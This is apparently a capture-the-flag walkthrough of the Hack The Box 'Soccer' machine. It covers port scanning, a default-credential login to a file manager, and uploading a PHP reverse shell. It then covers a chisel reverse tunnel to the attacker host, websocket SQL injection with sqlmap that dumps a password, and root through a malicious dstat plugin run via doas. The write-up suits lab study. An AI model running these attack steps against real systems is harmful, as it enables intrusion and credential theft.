<h2>Target: 10.129.90.77  Soccer </h2>

<b>Initial Access:</b><br>
nmap -Pn 10.129.90.77 --min-rate=5000 -p- |grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Output shows open ports: 22,80,9091

Enumerate these open ports further with nmap: <br>
nmap -Pn 10.129.90.77 --min-rate=5000 -p 22,80,9091 -sC -sV -oN nmap.soccer <br>
The output shows: 
 
![image](https://user-images.githubusercontent.com/93153300/208478531-1695c823-4ab5-4f75-8bf3-b70f7cb8d56e.png)
 
Visiting port 80 redirects to soccer.htb:

![image](https://user-images.githubusercontent.com/93153300/208478570-e925e70f-4dc8-49ee-8054-42ea312f4a5f.png)

To be able to access the site, add soccer.htb into the file /etc/hosts: 10.129.90.77  soccer.htb <br>

Visiting port 80 doesn’t show anything of interest.  Run directory brute force with dirsearch: dirsearch -r -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html -f -o dsearch.soccer

Dirsearch found a directory of /tiny/.  Visiting http://soccer.htb/tiny shows:
 
![image](https://user-images.githubusercontent.com/93153300/208478607-100fef3a-e6df-4ce3-8a19-6f1fb6955c95.png)

Google search ‘tiny file manager default credentials’.  We find default credentials of username admin and password admin@123.  Using these credentials we log in successfully and the page shows:
 
![image](https://user-images.githubusercontent.com/93153300/208478653-f47c1eea-158b-4be9-8f11-2ec1c6dd8e0d.png)

The top right corner shows a ‘Upload’ option.  Click on the ‘Upload’ option.  The page now shows: 
 
![image](https://user-images.githubusercontent.com/93153300/208478673-f5b986d4-cfbd-4b9f-b8f5-14ae08a87f98.png)
 
Open a netcat listener (we will use pwncat as it gives a better shell): pwncat-cs -lp 443 <br>
Upload a php pentestmonkey reverse shell (we will call this file friends.php).  The upload fails saying “The specified folder for upload isn’t writeable.”:

 ![image](https://user-images.githubusercontent.com/93153300/208478716-81043541-cac1-44ed-b8f0-2fc92d96c5ec.png)
 
The error message indicates that the reason the upload fails is because we cannot write to this directory.  To bypass this, try to find a directory we have permissions to write to.  The main page shows all the files and directories, and the permissions to each one: 
 
![image](https://user-images.githubusercontent.com/93153300/208478738-e45cb7be-cb68-451e-9392-5e3345112b93.png)

These are all owned by root and we don’t have write permissions to any of them.  Check in the directory ‘tiny’ if we have write permissions: 
 
![image](https://user-images.githubusercontent.com/93153300/208478776-a2f5e7f8-eccf-468b-b763-74ed852c09c4.png)
 
The ‘uploads’ directory shows we have write permissions (0757).  Upload our php pentestmonkey reverse shell into that directory.  To do that, click on the ‘uploads’ directory, and then click on ‘Upload’ in the top right corner.  The file uploads successfully:
 
![image](https://user-images.githubusercontent.com/93153300/208478810-53cd0514-234c-4cf7-ab57-7259360201cf.png)
  
Activate the php pentestmonkey reverse shell by navigating to its location: <br> http://soccer.htb/tiny/uploads/friends.php  <br>
Our pwncat listener caught the shell.  We have shell as www-data.  
_________________________________________________________________________
<b>Lateral Movement:<b><br>
The file ‘/etc/passwd’ shows a username of ‘player’. <br>
Check network connections on the target with command: netstat -ln
 
![image](https://user-images.githubusercontent.com/93153300/208478836-0fc8efdc-29d1-4268-9e97-ff67567b2b01.png)

We find that port 3000 is only accessible locally (127.0.0.1).  Use ‘chisel’ to get access to port 3000 over the web.  

Step 1: On our kali run the ‘chisel’ server using the command: ./chisel server -p 1111 --reverse <br>
Step 2: Upload ‘chisel’ to the target.  
Step 3: Run chisel on the target using the command: ./chisel client 10.10.14.201:1111 R:2222: 127.0.0.1:3000

These commands we ran with ‘chisel’ will cause 127.0.0.1:2222 on our local pc to redirect to 127.0.0.1:3000 on the target pc.  

Navigate to port 3000 by putting in the url 127.0.0.1:2222.  The page shows:
 
![image](https://user-images.githubusercontent.com/93153300/208478860-323dfa88-6bcb-45b9-916e-16e6324360b6.png)

The page is very similar to port 80, but it has additional options showing in the top left corner (‘Match’, ‘Login’, and ‘Signup’).  Go to ‘Signup’ and create an account, and then use the account to login.  After logging in, the page shows:
 
![image](https://user-images.githubusercontent.com/93153300/208478883-5f21bd31-3563-42d3-9d70-ece17757b6df.png)

Capture this page request of http://127.0.0.1:2222/check in burp suite.  Forward the first capture, and then a second capture will appear in burp suite:
 
![image](https://user-images.githubusercontent.com/93153300/208478923-0d41865e-4147-44de-b0b5-79d1e5e3b43d.png)
 
We find a new subdomain: soc-player.soccer.htb.  Add the subdomain into the file ‘/etc/hosts’.

Also, we see 2 headers mentioning ‘websocket’.  Google search ‘websocket’ to learn more about websocket.  

Enter the ticket number id into the input (the ticket number id is given to us on the page): 
 
![image](https://user-images.githubusercontent.com/93153300/208478960-3812e4cd-e367-471f-86bd-bb1e1607905c.png)
 
Capturing this ticket number id input request in burp suite shows: 
 
![image](https://user-images.githubusercontent.com/93153300/208479008-4bc9cd3c-38c5-472f-acd1-cc47191d9783.png)
 
Check for sql injection on this ‘id’ parameter using sqlmap.  Because of the way websocket works we cannot use sqlmap the standard way.  Google search ‘sql injection websocket’.  We find a site that explains how to run a sql injection over websocket: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

Follow these steps to run the sql injection: <br>
Step 1: Copy the python script from https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html.   <br>
Step 2: In this script, we need to change the ‘ws_server’ parameter to the ws being used on our site.  To find this, read the source code to http://127.0.0.1:2222/check:
 
![image](https://user-images.githubusercontent.com/93153300/208479049-87acc6ab-33f3-4c00-aad3-ecb0050add57.png)

The source code shows that the input ticket id function connects to a websocket of: ws://soc-player.soccer.htb:9091.  <br>
Step 3: Change the ‘ws_server’ parameter to the ws found in the source code: ws://soc-player.soccer.htb:9091.  Also, change the ‘data’ parameter to: '{"id":"%s"}' % message:

![image](https://user-images.githubusercontent.com/93153300/208479092-31391c90-6fe5-4bb2-8ab2-3196a68d75db.png)

Step 3: Run the python script: python script.py <br>
Step 4: Run sqlmap: sqlmap -u "http://localhost:8081/?id=1" --batch --dbs  -D soccer_db --tables -T accounts --columns -C username,password --dump

Sqlmap found credentials: username ‘player’ and password ‘PlayerOftheMatch2022’:
 
![image](https://user-images.githubusercontent.com/93153300/208479145-4869bcd5-d989-44b8-8c6b-b7e55772aca3.png)
 
Use these credentials to ssh into user ‘player’:  ssh player@soccer.htb  → enter the password when prompted. <br>
We have shell as user ‘player’.  Get the flag in /home/player/user.txt.
______________________________________________________________
<b>Privilege Escalation:<b><br>
Step 1: Look for available suid files using the command: find / -perm /4000 2>/dev/null
 
![image](https://user-images.githubusercontent.com/93153300/208479161-9182902d-a7d3-48de-a40e-4d344259dec8.png)

We find a suid file called ‘doas’.  The file ‘doas’ allows us to run a file as another user (similar to sudo).  

Step 2: Find the ‘doas.conf’ file to see what we can run with ‘doas’.  To find this file run the command: find / -name doas* 2>/dev/null <br>
We find a file of ‘/usr/local/etc/doas.conf’.  Reading the file shows: 
 
![image](https://user-images.githubusercontent.com/93153300/208479189-fbc3cf81-5285-4374-a19a-427dbd59403a.png)

The file shows the user ‘player’ can run ‘/usr/bin/dstat’ as root without providing a password.  

Step 3: If we have permissions to write to the ‘dstat’ file then we can edit ‘dstat’ to include a malicious command, and run it as root.  Unfortunately, we do not have write permissions to the ‘dstat’ file.  

Reading about ‘dstat’ we learn that the file ‘dstat’ supports custom plugins.  So we can create a malicious plugin and then run that plugin with ‘dstat’.  

If we create the malicious plugin in a random directory then ‘dstat’ won’t find the malicious plugin.  So we need to find a directory that we have write permissions and is associated to ‘dsat’.  To check for such a directory run the command: find / -name dstat -ls 2>/dev/null
 
![image](https://user-images.githubusercontent.com/93153300/208479224-ad31c396-fea4-4937-8120-4e558b373030.png)
 
We find the directory ‘/usr/local/share/dstat’ has write permissions.  

Step 4: Navigate to that directory and create a plugin called ‘dstat_blob.py’ containing the following contents:
 
![image](https://user-images.githubusercontent.com/93153300/208479248-5aff83ce-2719-48a3-98c3-4e5ddd5288d6.png)

This plugin will cause ‘/bin/bash’ to become a suid which we can then use to become root.  (The plugin we create must start with ‘dstat_’ and end with ‘.py’, otherwise ‘dstat’ won’t find the plugin.)  <br>

Step 5: Run the command: doas -u root /usr/bin/dstat --blob <br>

Step 6: Finally run the command: /bin/bash -p <br>
We have shell as root.  Get the flag in /root/root.txt.  
